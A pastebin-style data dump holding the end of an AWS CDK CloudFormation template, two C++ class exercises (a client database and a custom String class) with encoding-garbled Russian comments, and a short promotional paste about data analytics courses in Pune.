        {
         ""Ref"": ""AWS::Region""
        },
        ""ap-south-1""
       ]
      },
      {
       ""Fn::Equals"": [
        {
         ""Ref"": ""AWS::Region""
        },
        ""ap-southeast-1""
       ]
      },
      {
       ""Fn::Equals"": [
        {
         ""Ref"": ""AWS::Region""
        },
        ""ap-southeast-2""
       ]
      },
      {
       ""Fn::Equals"": [
        {
         ""Ref"": ""AWS::Region""
        },
        ""ca-central-1""
       ]
      },
      {
       ""Fn::Equals"": [
        {
         ""Ref"": ""AWS::Region""
        },
        ""cn-north-1""
       ]
      },
      {
       ""Fn::Equals"": [
        {
         ""Ref"": ""AWS::Region""
        },
        ""cn-northwest-1""
       ]
      }
     ]
    },
    {
     ""Fn::Or"": [
      {
       ""Fn::Equals"": [
        {
         ""Ref"": ""AWS::Region""
        },
        ""eu-central-1""
       ]
      },
      {
       ""Fn::Equals"": [
        {
         ""Ref"": ""AWS::Region""
        },
        ""eu-north-1""
       ]
      },
      {
       ""Fn::Equals"": [
        {
         ""Ref"": ""AWS::Region""
        },
        ""eu-south-1""
       ]
      },
      {
       ""Fn::Equals"": [
        {
         ""Ref"": ""AWS::Region""
        },
        ""eu-west-1""
       ]
      },
      {
       ""Fn::Equals"": [
        {
         ""Ref"": ""AWS::Region""
        },
        ""eu-west-2""
       ]
      },
      {
       ""Fn::Equals"": [
        {
         ""Ref"": ""AWS::Region""
        },
        ""eu-west-3""
       ]
      },
      {
       ""Fn::Equals"": [
        {
         ""Ref"": ""AWS::Region""
        },
        ""il-central-1""
       ]
      },
      {
       ""Fn::Equals"": [
        {
         ""Ref"": ""AWS::Region""
        },
        ""me-central-1""
       ]
      },
      {
       ""Fn::Equals"": [
        {
         ""Ref"": ""AWS::Region""
        },
        ""me-south-1""
       ]
      },
      {
       ""Fn::Equals"": [
        {
         ""Ref"": ""AWS::Region""
        },
        ""sa-east-1""
       ]
      }
     ]
    },
    {
     ""Fn::Or"": [
      {
       ""Fn::Equals"": [
        {
         ""Ref"": ""AWS::Region""
        },
        ""us-east-1""
       ]
      },
      {
       ""Fn::Equals"": [
        {
         ""Ref"": ""AWS::Region""
        },
        ""us-east-2""
       ]
      },
      {
       ""Fn::Equals"": [
        {
         ""Ref"": ""AWS::Region""
        },
        ""us-west-1""
       ]
      },
      {
       ""Fn::Equals"": [
        {
         ""Ref"": ""AWS::Region""
        },
        ""us-west-2""
       ]
      }
     ]
    }
   ]
  }
 },
 ""Parameters"": {
  ""BootstrapVersion"": {
   ""Type"": ""AWS::SSM::Parameter::Value<String>"",
   ""Default"": ""/cdk-bootstrap/hnb659fds/version"",
   ""Description"": ""Version of the CDK Bootstrap resources in this environment, automatically retrieved from SSM Parameter Store. [cdk:skip]""
  }
 },
 ""Rules"": {
  ""CheckBootstrapVersion"": {
   ""Assertions"": [
    {
     ""Assert"": {
      ""Fn::Not"": [
       {
        ""Fn::Contains"": [
         [
          ""1"",
          ""2"",
          ""3"",
          ""4"",
          ""5""
         ],
         {
          ""Ref"": ""BootstrapVersion""
         }
        ]
       }
      ]
     },
     ""AssertDescription"": ""CDK bootstrap stack version 6 required. Please run 'cdk bootstrap' with a recent version of the CDK CLI.""
    }
   ]
  }
 }
}"
TLpwGB7W,Untitled,35657,C++,Saturday 29th of June 2024 12:35:28 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>


using namespace std;

struct client {
	char name[30]; // –∏–º—è –∫–ª–∏–µ–Ω—Ç–∞
	char phone_number[20]; // –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞
	int client_id; // id –∫–ª–∏–µ–Ω—Ç–∞
	int personal_discount; // —Ä–∞–∑–º–µ—Ä —Å–∫–∏–¥–∫–∏
	bool regular_customer; // –ø–æ—Å—Ç–æ—è–Ω–Ω—ã–π –ø–æ–∫—É–ø–∞—Ç–µ–ª—å (–¥–∞ / –Ω–µ—Ç)
};

class client_base {

public:

	explicit client_base(const int new_base_size) : clients(new client[new_base_size]), clients_number(0), clients_base_size(new_base_size) {}

	client_base() : client_base(5) {}

	client_base(const client_base& other) : client_base(other.clients_base_size) {
		for (int i = 0; i < other.clients_number; i++) {
			new_client(other.clients[i].name, other.clients[i].phone_number, other.clients[i].client_id, other.clients[i].personal_discount, other.clients[i].regular_customer);
		}
	}

	client_base(client_base&& other) : clients(other.clients), clients_number(other.clients_number), clients_base_size(other.clients_base_size) {
		other.clients = nullptr;
	}

	client_base& operator=(const client_base& other) {
		if (this != &other) {
			delete[] clients;
			clients_number = other.clients_number;
			clients_base_size = other.clients_base_size;
			clients = new client[clients_base_size];
			for (int i = 0; i < other.clients_number; i++) {
				new_client(other.clients[i].name, other.clients[i].phone_number, other.clients[i].client_id, other.clients[i].personal_discount, other.clients[i].regular_customer);
			}
		}
		return *this;
	}

	client_base& operator=(client_base&& other) {
		if (this != &other) {
			delete[] clients;
			clients_number = other.clients_number;
			clients_base_size = other.clients_base_size;
			clients = other.clients;
			other.clients = nullptr;
		}
		return *this;
	}

	void new_client(const char* name, const char* phone_number, const int client_id, const int personal_discount, const bool regular_customer) {
		if (clients_number == clients_base_size) {
			client* temp = new client[clients_base_size * 2];
			for (int i = 0; i < clients_number; i++) {
				temp[i] = clients[i];
			}
			delete[] clients;
			clients = temp;
			clients_base_size *= 2;
		}
		strcpy(clients[clients_number].name, name);
		strcpy(clients[clients_number].phone_number, phone_number);
		clients[clients_number].client_id = client_id;
		clients[clients_number].personal_discount = personal_discount;
		clients[clients_number].regular_customer = regular_customer;
		clients_number++;
	}

	void del_client(const char* name) {
		for (int i = 0; i < clients_number; i++) {
			if (!strcmp(clients[i].name, name)) {
				for (int j = i; j < clients_number - 1; j++) {
					clients[j] = clients[j + 1];
				}
				i--; // –Ω–∞ —Å–ª—É—á–∞–π –∏–¥—É—â–∏—Ö –ø–æ–¥—Ä—è–¥ –∫–ª–∏–µ–Ω—Ç–æ–≤ —Å –æ–¥–∏–Ω–∞–∫–æ–≤—ã–º –∏–º–µ–Ω–µ–º (–∏–Ω–∞—á–µ –≤—Ç–æ—Ä–æ–≥–æ –ø–µ—Ä–µ—Å–∫–∞–∫–∏–≤–∞–µ—Ç)
				clients_number--;
			}
		}

	}

	void find_client(const char* name) const {
		for (int i = 0; i < clients_number; i++) {
			if (!strcmp(clients[i].name, name)) {
				cout << clients[i].name << "": –Ω–æ–º–µ—Ä "" << clients[i].phone_number << "", id "" << clients[i].client_id << "", —Å–∫–∏–¥–∫–∞ "" << clients[i].personal_discount << "" %"";
				if (clients[i].regular_customer) {
					cout << "", –ø–æ—Å—Ç–æ—è–Ω–Ω—ã–π –ø–æ–∫—É–ø–∞—Ç–µ–ª—å"";
				}
				cout << endl;
			}
		}
		cout << endl;
	}

	void show_all_clients() const {
		for (int i = 0; i < clients_number; i++) {
			cout << clients[i].name << "": –Ω–æ–º–µ—Ä "" << clients[i].phone_number << "", id "" << clients[i].client_id << "", —Å–∫–∏–¥–∫–∞ "" << clients[i].personal_discount << "" %"";
			if (clients[i].regular_customer) {
				cout << "", –ø–æ—Å—Ç–æ—è–Ω–Ω—ã–π –ø–æ–∫—É–ø–∞—Ç–µ–ª—å"";
			}
			cout << endl;
		}
		cout << endl;
	}

	void show_regular_clients() const {
		for (int i = 0; i < clients_number; i++) {
			if (clients[i].regular_customer) {
				cout << clients[i].name << "": –Ω–æ–º–µ—Ä "" << clients[i].phone_number << "", id "" << clients[i].client_id << "", —Å–∫–∏–¥–∫–∞ "" << clients[i].personal_discount << "" %"" << endl;
			}
		}
		cout << endl;
	}

	~client_base() {
		delete[] clients;
	}


private:
	client* clients; // –º–∞—Å—Å–∏–≤ –∫–ª–∏–µ–Ω—Ç–æ–≤
	int clients_number; // –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∫–ª–∏–µ–Ω—Ç–æ–≤
	int clients_base_size; // —Ä–∞–∑–º–µ—Ä –±–∞–∑—ã
};


int main() {

	setlocale(LC_ALL, ""ru"");

	client_base my_base(200);
	my_base.new_client(""–ò–≤–∞–Ω"", ""+79111111111"", 1129, 10, true);
	my_base.new_client(""–í–∞—Å—è"", ""+79111111222"", 1130, 5, false);
	my_base.new_client(""–û–ª–µ–≥"", ""+79111111333"", 1131, 15, true);
	my_base.new_client(""–ú–∞—Ä–∏—è"", ""+79111111444"", 1132, 10, false);
	my_base.new_client(""–ì–∞–ª—è"", ""+79111111555"", 1133, 20, true);
	my_base.show_all_clients();

	my_base.del_client(""–ò–≤–∞–Ω"");
	my_base.show_regular_clients();

	my_base.find_client(""–ì–∞–ª—è"");

	client_base my_base2 = move(my_base);

	my_base2.show_all_clients();
}"
jgRjAM0U,Data Analytics Courses in Pune,Dipav,C#,Saturday 29th of June 2024 12:26:52 AM CDT,"Data analytics is the process of examining data sets to draw conclusions and identify patterns, trends, and anomalies. It involves using various techniques such as statistical modeling, machine learning, and data visualization to extract insights from data.

The goal of data analytics is to turn data into actionable information that can inform business decisions, solve problems, or optimize processes. It involves several key steps:

1. Data collection and cleaning
2. Data processing and storage
3. Data analysis and modeling
4. Insight generation and visualization
5. Recommendation and implementation

Data analytics is applied in various fields, including:

1. Business intelligence (e.g., customer behavior, market trends)
2. Healthcare (e.g., patient outcomes, disease diagnosis)
3. Finance (e.g., risk management, fraud detection)
4. Sports (e.g., player performance, game strategy)
5. Environmental monitoring (e.g., climate change, air quality)

Some common data analytics techniques include:

1. Descriptive analytics (e.g., summarizing data)
2. Predictive analytics (e.g., forecasting outcomes)
3. Prescriptive analytics (e.g., recommending actions)
4. Text analytics (e.g., sentiment analysis)
5. Big data analytics (e.g., processing large datasets)

Data analytics tools and technologies include:

1. Spreadsheets (e.g., Excel)
2. Data visualization software (e.g., Tableau, Power BI)
3. Statistical programming languages (e.g., R, Python)
4. Machine learning libraries (e.g., sci-kit-learn, TensorFlow)
5. Data management platforms (e.g., Hadoop, Spark)

<a herfs=""https://www.sevenmentor.com/data-analytics-courses-in-pune.php/>Data Analytics Course in Pune</a>"
0mTVMXVV,Untitled,35657,C++,Friday 28th of June 2024 11:50:51 PM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>

using namespace std;

class String {

public:

	String() : size_(0), capacity_(15), str_(new char[capacity_]) {}

	explicit String(const int string_capacity) : size_(0), capacity_(string_capacity), str_(new char[capacity_]) {}

	String(const char* new_string) : size_(strlen(new_string)), capacity_(size_ + 1), str_(new char[capacity_]) {
		strcpy(str_, new_string);
	}

	String(const String& other) : size_(other.size_), capacity_(other.capacity_), str_(new char[capacity_]) {
		strcpy(str_, other.str_);
	}

	String(String&& other) : size_(other.size_), capacity_(other.capacity_), str_(other.str_) {
		other.str_ = nullptr;
		other.size_ = 0;
		other.capacity_ = 0;
	}

	String& operator=(const String& other) {
		if (&other != this) {
			size_ = other.size_;
			capacity_ = other.capacity_;
			delete[] str_;
			str_ = new char[capacity_];
			strcpy(str_, other.str_);
		}
		return *this;
	}

String& operator=(String&& other) {
		if (&other != this) { 
			size_ = other.size_;
			capacity_ = other.capacity_;
			delete[] str_;
			str_ = other.str_;
			other.str_ = nullptr;
			other.size_ = 0;
			other.capacity_ = 0;
		}
		return *this;
	} 

	String& operator=(const char* new_string) {
		int new_space = strlen(new_string) + 1;
		if (capacity_ < new_space) {
			delete[] str_;
			capacity_ = new_space;
			str_ = new char[capacity_];
		}
		strcpy(str_, new_string);
		size_ = capacity_ - 1;
		return *this;
	}

	char& operator[](const int index) {
		if (index < 0 || index >= size_) {
			cout << ""–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –∏–Ω–¥–µ–∫—Å"" << endl;
		}
		return str_[index];
	}

	const char& operator[](const int index) const {
		if (index < 0 || index >= size_) {
			cout << ""–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –∏–Ω–¥–µ–∫—Å"" << endl;
		}
		return str_[index];
	}

	bool operator==(const String& other) const {
		return strcmp(str_, other.str_) == 0;
	}

	bool operator!=(const String& other) const {
		return strcmp(str_, other.str_) != 0;
	}

	int size() const {
		return size_;
	}

	int capacity() const {
		return capacity_;
	}

	~String() {
		delete[] str_;
	}

	friend ostream& operator<<(ostream& output, const String& str);

private:
	int size_;
	int capacity_;
	char* str_;
};


ostream& operator<<(ostream& output, const String& str) {
	output << str.str_;
	return output;
}

istream& operator>>(istream& input, String& str) {
	int capacity = 15;
	int i = 0;
	char* new_str = new char[capacity];
	char ch;

	while (ch = input.get()) {
		if (ch == ' ' || ch == '\n') {
			break;
		}
		if (i == capacity - 1) {
			char* temp = new char[capacity *= 2];
			strcpy(temp, new_str);
			delete[] new_str;
			new_str = temp;
		}
		new_str[i++] = ch;
	}
	new_str[i] = '\0';
	str = new_str;
	delete[] new_str;
	return input;
}

int main() {
	setlocale(LC_ALL, ""ru"");

	String str1;

	String str2(30);

	String str3(""–ü—Ä–∏–≤–µ—Ç"");

	cout << str3 << endl;

	str3= ""–ù–æ–≤–∞—è —Å—Ç—Ä–æ–∫–∞"";

	cout << str3 << endl;

	str1 = ""–ï—â–µ –æ–¥–Ω–∞ –Ω–æ–≤–∞—è —Å—Ç—Ä–æ–∫–∞"";

	cout << str1 << endl;

	String str4(str3);

	cout << str4 << endl;

	str4 = str1;

	cout << str1 << endl;

	cout << str4 << endl;

	str4[5] = '–Ω';

	cout << str4 << endl;

	cout << (str3 == str4) << endl;

	cout << (str3 != str4) << endl;
}
"
